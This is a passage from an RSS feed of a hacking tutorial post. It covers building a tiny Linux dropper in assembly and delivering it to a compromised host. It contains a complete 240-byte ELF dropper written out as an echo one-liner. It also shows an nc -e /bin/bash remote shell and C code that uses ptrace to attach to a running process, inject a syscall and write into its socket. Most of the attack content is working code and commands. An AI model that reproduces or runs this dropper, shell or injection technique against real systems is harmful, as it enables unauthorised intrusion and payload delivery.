	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall
	
_exit:
	xor eax,eax
	add al, 60

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
filesize equ $ - $$

</code></pre>
<p>This version is 240 bytes long and it is suitable to be dropped using a single <code>echo</code>.</p>
<pre><code class="lang-auto">echo -n -e "\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01" &gt; fwget; chmod +x fwget

</code></pre>
<p>In other words, it is small enough to be typed manually :). In case some compressor is available on the target machine a few more bytes could be saved, but not much more.</p>
<h1>Final word about the dropper</h1>
<p>As you may have noticed, this dropper connects to a hard-coded machine. Be free to add some extra code to process command-line arguments and made this value a parameter (the command-line parameters are passed to <code>_start</code> in the stack), but that will just increase the size of our dropper.</p>
<p>You can easily recompile your dropper with a new IP/Port or just write a small program/script to patch the binary. This I’ll leave as an exercise for the reader.</p>
<h1>Dropping a Dropper like a pro</h1>
<p>At this point, we are done with this lesson, but as this was a little bit light, let’s add a bit of coolness. Yes, sure, we can drop our dropper just pasting the previous <code>echo</code> command in our interactive console, or redirecting the file using whatever tool we already use to get into our interactive session. But, let’s face it. That is a pretty boring way of doing it.</p>
<p>So, what we are going to do is to attach to the interactive shell program (in this example we will be using <code>nc</code>), and drop our commands directly on the open socket to the remote machine. In order to figure out which socket you need to write to, we can check <code>/proc/PID/fd</code>. Let’s setup our environment.</p>
<p>Suppose we have got access to machine <code>target</code> and started a remove shell using <code>nc.openbsd</code> (the other one does not have the flag <code>-e</code>). Something like this:</p>
<pre><code>hacker@target $ nc -e /bin/bash -l -p 1234
</code></pre>
<p>Now, from the hackers machine we can start a remote shell session like this:</p>
<pre><code>hacker@hackerbox $ nc target 1234
</code></pre>
<p>At this point, we have a TCP connection to machine <code>target</code> going on. If we now get the pid can check the open file descriptors for this process:</p>
<pre><code>hacker@hackerbox $ ps ax | grep "nc target" | head -1
 8095 pts/37   S+     0:00 nc target 1234
hacker@hackerbox $ ls -l /proc/8095/fd
total 0
lrwx------ 1 pico pico 64 Sep 12 11:25 0 -&gt; /dev/pts/37
lrwx------ 1 pico pico 64 Sep 12 11:25 1 -&gt; /dev/pts/37
lrwx------ 1 pico pico 64 Sep 12 11:25 2 -&gt; /dev/pts/37
lr-x------ 1 pico pico 64 Sep 12 11:25 3 -&gt; 'pipe:[45281146]'
l-wx------ 1 pico pico 64 Sep 12 11:25 4 -&gt; 'pipe:[45281146]'
lrwx------ 1 pico pico 64 Sep 12 11:25 5 -&gt; 'socket:[60870195]'
</code></pre>
<p>Here we can see the three first file descriptors associated to the pseudoterminal, namely: <code>stdin</code>, <code>stdout</code> and <code>stderr</code>. Then a <code>pipe</code> what I’m not sure why it is created for, but it would be a nice exercise to check it out.</p>
<p>Finally, we can see that file descriptor 5 is our socket… So now we know where to write our stuff.</p>
<h1>Attaching to the process. Meeting <code>ptrace</code>
</h1>
<p>It is time to start writing our cool tool. It will attach to any process as a debugger and write some data to a given file descriptor within that process. The way to achieve this is using the system call <code>ptrace</code>.</p>
<p>Again, the program may look complex at first glance, but it is just a basic sequence of system calls being executed sequentially… Actually it is just one single system call (<code>ptrace</code>) being executed with different parameters.</p>
<p>I will not put all the code here. You can find it on my <a href="https://github.com/0x00pf/0x00sec_code" rel="noopener nofollow ugc">github repository</a>. Here I will just include the relevant parts of the program.</p>
<p>So, the first thing we have to do, as indicated before is to get attached to the indicated process:</p>
<pre><code class="lang-auto">  _pid = atoi (argv[1]);

  printf ("+ Attaching to process %ld\n", _pid);
  if ((ptrace (PTRACE_ATTACH, _pid, NULL, NULL)) &lt; 0)
    perror ("ptrace_attach:");
  
  printf ("%s", " ..... Waiting for process...\n");
  wait (&amp;status);
</code></pre>
<p>The <code>atoi</code> function at the beginning allows us to convert a string (<code>Ascii</code>) to an number (<code>Integer</code>)(<code>AsciiTOInteger</code> -&gt; <code>atoi</code>). Yes, we are passing the <code>pid</code> to attach to as a parameter to our program. Then we just find the <code>ptrace</code> system call being invoked with the <em>request</em> <code>PTRACE_ATTACH</code> that allows us to get attached to the process indicated by the second parameter. Parameters 3 and 4 are not used for this request.</p>
<p>After issuing this request, we need to wait for the process to stop and give us back the control. This we do using the system call <code>wait</code>.</p>
<p>At this point we have full access to the process and we can do whatever we want with it.</p>
<p><em>Note: You need to have enough permissions to be able to attach to a running process</em></p>
<h1>Preparing code injection</h1>
<p>Now we have to do some tasks to be able to execute some code from within the process being controlled. The first thing we do is to retrieve the current registers values. We will be using these values to run our code but also, we want to restore everything to the previous state when we are done, so our remote shell session continues working normally.</p>
<pre><code class="lang-auto">  if ((ptrace (PTRACE_GETREGS, _pid, 0, &amp;regs)) &lt; 0) 
      perror ("ptrace_get_regs:");
  memcpy (&amp;regs_cpy, &amp;regs, sizeof (struct user_regs_struct));
</code></pre>
<p>Pretty straight forward isn’t it?. After getting the registers we made a copy that we will be using during the clean-up to get everything as it was before we break into the process.</p>
<p>The other thing we have to do is to save the current instruction being executed. Ok, this looks like a good time to further explain what we are going to do.</p>
<p>In order to write into a file descriptor, we have to issue the <code>write</code> system call. As we know, to run a system call we just need to set our registers and then run the <code>syscall</code> instruction. We can deal with the registers separately using the <code>PTRACE_GETREGS</code> (yes, sure, there is a <code>PTRACE_SETREGS</code> also, so we are done there), but we need to run the <code>syscall</code> instruction. For doing that we have 2 options:</p>
<ul>
<li>We scan the memory looking for the instruction and set <code>RIP</code> to point there so when we re-start the process that instruction get executed…</li>
<li>Or we just insert the <code>syscall</code> instruction at whatever place. In that case, we need to store the previous value at that position, in order to restore it once our system call has been executed.</li>
</ul>
<p>We chose the second option, so we need to get the current opcode and overwrite it:</p>
<pre><code class="lang-auto"> if ((opcode = ptrace (PTRACE_PEEKTEXT, _pid, regs.rip, 0)) &lt; 0)
    perror ("retrieve opcode:");
(...)
  ptrace (PTRACE_POKETEXT, _pid, regs.rip, 0x050f050f050f050f);
	
</code></pre>
<p>Also pretty straightforward. We use <code>PTRACE_PEEKTEXT</code> to read the current opcode (the one <code>RIP</code> is pointing to, and then we inject our <code>syscall</code> instruction (<code>0x05 0x0f</code>). To be honest I didn’t bother to figure out, if the opcodes should be in the lower part of the long or in the high… I just filled the whole 8 bytes with the opcode to be sure. Anyways, <code>ptrace</code> will write the 8 bytes…</p>
<h1>Allocating a buffer and filling it</h1>
<p>We are almost ready to run our <code>write</code> system call. We just need a buffer to hold the data we want to send through the socket.</p>
<p>Again, we can do this in many different ways:</p>
<ul>
<li>We can overwrite part of the <code>text</code> segment with our data and then restore it as we have done with the opcode in the previous section.</li>
<li>Doing something similar on the <code>data</code> segment</li>
<li>Actually allocate memory using <code>brk</code> and then release it</li>
<li>Or just use the stack</li>
</ul>
<p>So, we went for the last option as it was the simplest. We just make some room in the <code>stack</code> to be sure we do not overwrite any previous data in there when we write our data. We do not need to do anything else, at the end of the process, when we restore the original register values, the stack pointer will go back to the right position and all the memory we used will immediately be recover.</p>
<p>We wrote a simple function to poke arbitrary strings in the stack. The function looks like this:</p>
<pre><code class="lang-auto">int cpy_str (pid_t _pid, char *str, unsigned long long int *p) {
  int                     i;
  int                     len = strlen (str);
  int                     len1 = (len / 8) + 1;
  char                   *aux = malloc (len1 * 8);
  unsigned long long int *d = (unsigned long long int*)aux;

  printf ("!! Reallocating %d to %d bytes\n", len, len1);
  memset (aux, 0, len1);
  strcpy (d, str);
  
  for (i = 0; i &lt; len1 + 1; i++)    {
      if ((ptrace (PTRACE_POKEDATA, _pid, p, *d)) &lt; 0) perror ("POKE Stack:");
      p++; d++;
    }
	
  free (aux);
  return len;
}
</code></pre>
<p>The function just copies a given string into a given address. But as we have to do this in blocks of 8 bytes, I have just reallocated a new buffer adjusted to 8 bytes boundary and used it, instead of having extra checks in the loop.</p>
<p>The <code>for</code> loop in the code above is like a compressed form of <code>while</code> loop.</p>
<pre><code class="lang-auto">for (i = 0; i &lt; len1; i++) { (...) }
</code></pre>
<p>is equivalent to</p>
<pre><code class="lang-auto">i = 0;
while (i &lt; len1) {
  (...)
  i++;
}
</code></pre>
<p>Function <code>memset</code> and <code>strcpy</code> allow us to initialise a given memory region with a value or copy a memory buffer into another. <code>strcpy</code> work on C strings that are delimited by a tailing <code>\0</code>. In this case that is fine for us, otherwise we should determine the size ourselves and use <code>memcpy</code> instead.</p>
<h1>Sending the data</h1>
<p>Now, everything is setup to send our data through the socket we had already identified. We had overwrite the current instruction to become a <code>syscall</code>. We have our buffer in the stack. So, now we just need to set our registers up and let the process continue execution.</p>
<pre><code class="lang-auto">     regs.rax = 1;        // Write syscall
     regs.rdi = 5;        // socket (the one we identified at /proc/PID/fd
     regs.rsi = regs.rsp; // Buf in the stack
     regs.rdx= slen;      // Len of buffer to write
      
     if ((ptrace (PTRACE_SETREGS, _pid, 0, &amp;regs)) &lt; 0)
	    perror ("ptrace_set_regs:");
	
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) &lt; 0) perror ("Run syscallL");
     wait (&amp;status);
	  
     if ((ptrace (PTRACE_SINGLESTEP, _pid, 0,0)) &lt; 0) perror ("Run syscallL");
     wait (&amp;status);
</code></pre>
<p>So, we set our registers. See it as a bunch of <code>mov</code>s, but we can just set all of them at once using <code>PTRACE_SETREGS</code>. Then we use the <code>PTRACE_SINGLESTEP</code> to run our instruction and <code>wait</code> to get control back from the process.</p>
<p>Here I have to say that I haven’t figured our yet why I need to call <code>PTRACE_SINGLESTEP</code> twice. If anybody know, let us all know in the comments.</p>
<h1>Cleaning up</h1>
<p>Now the buffer has been sent to the remote machine. We just need to send the <code>echo</code> command shown above to <em>Drop the Dropper</em> in the remote machine.</p>
<p>Finally, we just want to clean up, so our shell session keeps going normally. If we just stop here, <code>nc</code> will likely crash. The clean up code is also straightforward:</p>
<pre><code class="lang-auto">  if ((ptrace (PTRACE_POKETEXT, _pid, regs_cpy.rip, opcode)) &lt; 0) 
       perror ("Restore opcode:");

  if ((ptrace (PTRACE_SETREGS, _pid, 0, &amp;regs_cpy)) &lt; 0) 
       perror ("ptrace_set_regs:");
  
  if ((ptrace (PTRACE_DETACH, _pid, NULL, NULL)) &lt; 0) 
       perror ("ptrace_deattach:");
  wait (&amp;status);
</code></pre>
<p>The first thing we do is to restore the original opcode we override with our own <code>syscall</code> opcodes. Note that we are now using the copy of the registers we made at the beginning, so everything will go to the right place despite of how much we could have messed around while tracing the process.</p>
<p>Then we restore the registers and everything should be fine to get back to the point it was before we attached to the process. Now we just need to <code>detach</code> from the process and it will just keep running normally.</p>
<h1>Conclusions</h1>
<p>In this part we have worked on the concept we already know and applied it to the case of building a dropper. We have lightly touched the field of network programming and we ended up introducing the basics about writing debuggers.</p>
<p>Most of what we have seen in this part is pretty similar to stuff you may find in the real world. Take a look to <a href="https://0x00sec.org/t/iot-malware-droppers-mirai-and-hajime/1966">this post</a> specially to the paper linked at the end about Hajime.</p>
<p>Did you made the dropper smaller?. Have you used other ideas to shrinking it?. Let us know. Any comment, question and feedback is welcomed! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>You can get all the code from my repo here:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/0x00pf/0x00sec_code/tree/master/min_dropper" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/min_dropper" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>

<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090/1</link>
        <pubDate>Sat, 12 Sep 2020 11:49:15 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-23090-1</guid>
        <source url="https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090.rss">Programming for Wannabes. Part V. A Dropper</source>
      </item>
  </channel>
</rss>
